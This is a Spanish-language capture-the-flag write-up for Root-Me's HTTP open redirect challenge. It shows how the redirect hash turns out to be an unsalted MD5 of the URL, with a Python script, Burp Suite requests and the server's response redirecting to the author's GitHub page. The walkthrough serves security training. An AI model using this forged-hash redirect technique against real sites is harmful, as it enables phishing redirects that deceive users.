Writeup: HTTP - Open Redirect (Root-Me CH52)

Autor del reto: Swissky
Dificultad: Fácil
Puntos: 10
Enunciado

    Encuentra una manera de hacer una redirección a un dominio distinto de los que se muestran en la página web.

Proceso de resolución
1. Reconocimiento inicial

La página muestra tres enlaces:
html

<a href='?url=https://facebook.com&h=a023cfbf5f1c39bdf8407f28b60cd134'>facebook</a>
<a href='?url=https://twitter.com&h=be8b09f7f1f66235a9c91986952483f0'>twitter</a>
<a href='?url=https://slack.com&h=e52dc719664ead63be3d5066c135b6da'>slack</a>

Observamos que cada enlace tiene:

    Un parámetro url con el dominio

    Un parámetro h con un hash de 32 caracteres (formato MD5)

2. Primer intento: modificar directamente la URL

Probamos a cambiar la URL en la barra de direcciones:
text

https://challenge01.root-me.org/web-serveur/ch52/?url=https://google.com&h=a023cfbf5f1c39bdf8407f28b60cd134

El servidor respondió con:
html

<p id='error'>Incorrect hash!</p>

Esto confirma que el servidor valida el hash y no permite cambiar la URL sin el hash correcto.
3. Análisis de los hashes

Extraemos los tres hashes de la página:
text

facebook → a023cfbf5f1c39bdf8407f28b60cd134
twitter  → be8b09f7f1f66235a9c91986952483f0
slack    → e52dc719664ead63be3d5066c135b6da

Creamos un script en Python para comprobar cómo se generan:

comparacion_hashes.py:
python

import hashlib

# Sin secreto, solo la URL
hash_fb = hashlib.md5(b'https://facebook.com').hexdigest()
print(f"Facebook: {hash_fb}")
print(f"Esperado:  a023cfbf5f1c39bdf8407f28b60cd134")
print(f"✅ {hash_fb == 'a023cfbf5f1c39bdf8407f28b60cd134'}\n")

hash_tw = hashlib.md5(b'https://twitter.com').hexdigest()
print(f"Twitter:  {hash_tw}")
print(f"Esperado: be8b09f7f1f66235a9c91986952483f0")
print(f"✅ {hash_tw == 'be8b09f7f1f66235a9c91986952483f0'}\n")

hash_sl = hashlib.md5(b'https://slack.com').hexdigest()
print(f"Slack:    {hash_sl}")
print(f"Esperado: e52dc719664ead63be3d5066c135b6da")
print(f"✅ {hash_sl == 'e52dc719664ead63be3d5066c135b6da'}")

Ejecución:
bash

python3 comparacion_hashes.py

Resultado:
text

Facebook: a023cfbf5f1c39bdf8407f28b60cd134
Esperado:  a023cfbf5f1c39bdf8407f28b60cd134
✅ True

Twitter:  be8b09f7f1f66235a9c91986952483f0
Esperado: be8b09f7f1f66235a9c91986952483f0
✅ True

Slack:    e52dc719664ead63be3d5066c135b6da
Esperado: e52dc719664ead63be3d5066c135b6da
✅ True

Conclusión: El hash es MD5 directo de la URL. No hay secreto.
4. Generamos el hash para nuestro dominio

Elegimos redirigir a:
text

https://github.com/kr3s4l4

Calculamos su MD5:
python

import hashlib
hashlib.md5(b'https://github.com/kr3s4l4').hexdigest()

Resultado:
text

facd23639d590630edda833f9837e39a

5. Modificamos la petición con Burp Suite

Interceptamos la petición original con Burp Suite:
text

GET /web-serveur/ch52/?url=https://slack.com&h=e52dc719664ead63be3d5066c135b6da HTTP/1.1
Host: challenge01.root-me.org
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Referer: http://challenge01.root-me.org/web-serveur/ch52/
Upgrade-Insecure-Requests: 1
Priority: u=0, i

La modificamos con nuestro dominio y hash:
text

GET /web-serveur/ch52/?url=https://github.com/kr3s4l4&h=facd23639d590630edda833f9837e39a HTTP/1.1
Host: challenge01.root-me.org
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Referer: http://challenge01.root-me.org/web-serveur/ch52/
Upgrade-Insecure-Requests: 1
Priority: u=0, i

6. Respuesta del servidor

El servidor respondió:
html

<!DOCTYPE html>
<html>
<head>
        <title>HTTP - Open redirect</title>
</head>

<body>
    <link rel='stylesheet' property='stylesheet' id='s' type='text/css' href='/template/s.css' media='all' />
    <iframe id='iframe' src='https://www.root-me.org/?page=externe_header'></iframe>
    <p>Well done, the flag is ************************</p>
    <script>document.location = 'https://github.com/kr3s4l4';</script>
    ...
</body>
</html>

Explicación técnica

El reto funciona así:

    El servidor genera enlaces a dominios permitidos (facebook, twitter, slack)

    Cada enlace incluye un hash MD5 de la URL

    Al hacer clic, el servidor:

        Toma la URL del parámetro url

        Calcula su MD5

        Compara con el hash proporcionado

        Si coinciden, redirige a la URL

    No hay lista blanca de dominios, solo validación del hash

    Como el hash es MD5 directo, cualquier usuario puede calcular el MD5 de cualquier dominio y redirigir a él
